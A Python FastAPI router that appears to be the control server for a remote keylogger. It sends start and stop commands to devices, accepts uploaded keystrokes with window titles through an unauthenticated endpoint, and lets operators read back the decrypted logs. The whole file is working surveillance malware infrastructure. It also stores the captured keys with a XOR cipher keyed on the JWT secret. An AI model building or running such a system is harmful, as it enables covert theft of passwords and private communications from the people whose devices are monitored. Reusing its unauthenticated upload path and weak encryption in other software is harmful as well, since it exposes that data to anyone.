from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, and_
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime
import uuid
import json

from database import get_db
from auth import get_current_user
from models.db import Device, KeyloggerSession, Keylog
from config import get_settings

settings = get_settings()
router = APIRouter(prefix="/api/devices", tags=["keylogger"])


# Encryption helper
def encrypt_keylog_data(data: str) -> bytes:
    """Simple XOR encryption for demo. Replace with real encryption in production."""
    # TODO: Use proper encryption (AES-256-GCM) with key from env
    key = settings.jwt_secret.encode()
    encrypted = bytearray()
    for i, char in enumerate(data.encode()):
        encrypted.append(char ^ key[i % len(key)])
    return bytes(encrypted)


def decrypt_keylog_data(data: bytes) -> str:
    """Simple XOR decryption for demo. Replace with real encryption in production."""
    key = settings.jwt_secret.encode()
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key[i % len(key)])
    return decrypted.decode()


# Request/Response models
class KeyloggerStartRequest(BaseModel):
    device_id: str


class KeyloggerResponse(BaseModel):
    status: str
    message: str
    session_id: Optional[str] = None


class KeylogEntry(BaseModel):
    key: str
    timestamp: str
    window_title: Optional[str] = None


class KeylogUploadRequest(BaseModel):
    device_id: str
    entries: List[KeylogEntry]


class KeylogData(BaseModel):
    id: str
    timestamp: str
    data: str
    window_title: Optional[str]


@router.post("/{device_id}/keylogger/start")
async def start_keylogger(
    device_id: str,
    session: AsyncSession = Depends(get_db),
    user: dict = Depends(get_current_user)
):
    """Start keylogger on a device"""
    # Check if device exists
    result = await session.execute(select(Device).where(Device.id == device_id))
    device = result.scalars().first()
    
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Check if already running
    result = await session.execute(
        select(KeyloggerSession)
        .where(and_(
            KeyloggerSession.device_id == device_id,
            KeyloggerSession.status == "active"
        ))
    )
    existing_session = result.scalars().first()
    
    if existing_session:
        return {
            "status": "already_running",
            "message": "Keylogger is already active on this device",
            "session_id": existing_session.id
        }
    
    # Create new session
    session_id = str(uuid.uuid4())
    new_session = KeyloggerSession(
        id=session_id,
        device_id=device_id,
        started_by=user["sub"],
        status="active"
    )
    session.add(new_session)
    await session.commit()
    
    # Send command to device via command queue
    from models.db import CommandQueue
    command_id = str(uuid.uuid4())
    command = CommandQueue(
        id=command_id,
        device_id=device_id,
        payload={
            "command_id": command_id,
            "type": "keylogger",
            "payload": "start",
            "timeout_seconds": 30
        }
    )
    session.add(command)
    await session.commit()
    
    return {
        "status": "started",
        "message": "Keylogger start command sent",
        "session_id": session_id,
        "command_id": command_id
    }


@router.post("/{device_id}/keylogger/stop")
async def stop_keylogger(
    device_id: str,
    session: AsyncSession = Depends(get_db),
    user: dict = Depends(get_current_user)
):
    """Stop keylogger on a device"""
    # Find active session
    result = await session.execute(
        select(KeyloggerSession)
        .where(and_(
            KeyloggerSession.device_id == device_id,
            KeyloggerSession.status == "active"
        ))
    )
    active_session = result.scalars().first()
    
    if not active_session:
        return {
            "status": "not_running",
            "message": "Keylogger is not active on this device"
        }
    
    # Update session
    active_session.status = "stopped"
    active_session.stopped_at = datetime.utcnow()
    
    # Send stop command
    from models.db import CommandQueue
    command_id = str(uuid.uuid4())
    command = CommandQueue(
        id=command_id,
        device_id=device_id,
        payload={
            "command_id": command_id,
            "type": "keylogger",
            "payload": "stop",
            "timeout_seconds": 30
        }
    )
    session.add(command)
    await session.commit()
    
    return {
        "status": "stopped",
        "message": "Keylogger stop command sent",
        "session_id": active_session.id,
        "command_id": command_id
    }


@router.get("/{device_id}/keylogger/status")
async def get_keylogger_status(
    device_id: str,
    session: AsyncSession = Depends(get_db),
    user: dict = Depends(get_current_user)
):
    """Get keylogger status for a device"""
    # Check for active session
    result = await session.execute(
        select(KeyloggerSession)
        .where(and_(
            KeyloggerSession.device_id == device_id,
            KeyloggerSession.status == "active"
        ))
    )
    active_session = result.scalars().first()
    
    if active_session:
        # Get keylog count
        count_result = await session.execute(
            select(Keylog)
            .where(Keylog.session_id == active_session.id)
        )
        keylog_count = len(count_result.scalars().all())
        
        return {
            "status": "active",
            "is_running": True,
            "session_id": active_session.id,
            "started_at": active_session.started_at.isoformat(),
            "started_by": active_session.started_by,
            "keylog_count": keylog_count
        }
    else:
        return {
            "status": "stopped",
            "is_running": False
        }


@router.post("/{device_id}/keylogs/upload")
async def upload_keylogs(
    device_id: str,
    data: KeylogUploadRequest,
    session: AsyncSession = Depends(get_db)
):
    """Agent endpoint to upload captured keylogs"""
    # Find active session
    result = await session.execute(
        select(KeyloggerSession)
        .where(and_(
            KeyloggerSession.device_id == device_id,
            KeyloggerSession.status == "active"
        ))
    )
    active_session = result.scalars().first()
    
    session_id = active_session.id if active_session else None
    
    # Store each entry
    for entry in data.entries:
        keylog_id = str(uuid.uuid4())
        
        # Prepare data for encryption
        entry_data = json.dumps({
            "key": entry.key,
            "window_title": entry.window_title
        })
        
        # Encrypt
        encrypted_data = encrypt_keylog_data(entry_data)
        
        # Parse timestamp
        try:
            captured_at = datetime.fromisoformat(entry.timestamp.replace('Z', '+00:00'))
        except:
            captured_at = datetime.utcnow()
        
        keylog = Keylog(
            id=keylog_id,
            device_id=device_id,
            session_id=session_id,
            data=encrypted_data,
            captured_at=captured_at
        )
        session.add(keylog)
    
    await session.commit()
    
    return {
        "status": "uploaded",
        "count": len(data.entries)
    }


@router.get("/{device_id}/keylogs")
async def get_keylogs(
    device_id: str,
    start_date: Optional[str] = None,
    end_date: Optional[str] = None,
    session_id: Optional[str] = None,
    limit: int = 1000,
    session: AsyncSession = Depends(get_db),
    user: dict = Depends(get_current_user)
):
    """Get keylogs for a device"""
    query = select(Keylog).where(Keylog.device_id == device_id)
    
    if session_id:
        query = query.where(Keylog.session_id == session_id)
    
    if start_date:
        try:
            start_dt = datetime.fromisoformat(start_date.replace('Z', '+00:00'))
            query = query.where(Keylog.captured_at >= start_dt)
        except:
            pass
    
    if end_date:
        try:
            end_dt = datetime.fromisoformat(end_date.replace('Z', '+00:00'))
            query = query.where(Keylog.captured_at <= end_dt)
        except:
            pass
    
    query = query.order_by(Keylog.captured_at).limit(limit)
    
    result = await session.execute(query)
    keylogs = result.scalars().all()
    
    # Decrypt and return
    decrypted_logs = []
    for log in keylogs:
        try:
            decrypted_data = decrypt_keylog_data(log.data)
            entry_data = json.loads(decrypted_data)
            
            decrypted_logs.append({
                "id": log.id,
                "timestamp": log.captured_at.isoformat(),
                "key": entry_data.get("key"),
                "window_title": entry_data.get("window_title")
            })
        except Exception as e:
            # Skip corrupted entries
            continue
    
    return {
        "device_id": device_id,
        "count": len(decrypted_logs),
        "keylogs": decrypted_logs
    }


@router.get("/{device_id}/keylogger/sessions")
async def get_keylogger_sessions(
    device_id: str,
    session: AsyncSession = Depends(get_db),
    user: dict = Depends(get_current_user)
):
    """Get all keylogger sessions for a device"""
    result = await session.execute(
        select(KeyloggerSession)
        .where(KeyloggerSession.device_id == device_id)
        .order_by(KeyloggerSession.started_at.desc())
    )
    sessions = result.scalars().all()
    
    return {
        "device_id": device_id,
        "sessions": [
            {
                "id": s.id,
                "started_at": s.started_at.isoformat(),
                "stopped_at": s.stopped_at.isoformat() if s.stopped_at else None,
                "started_by": s.started_by,
                "status": s.status
            }
            for s in sessions
        ]
    }
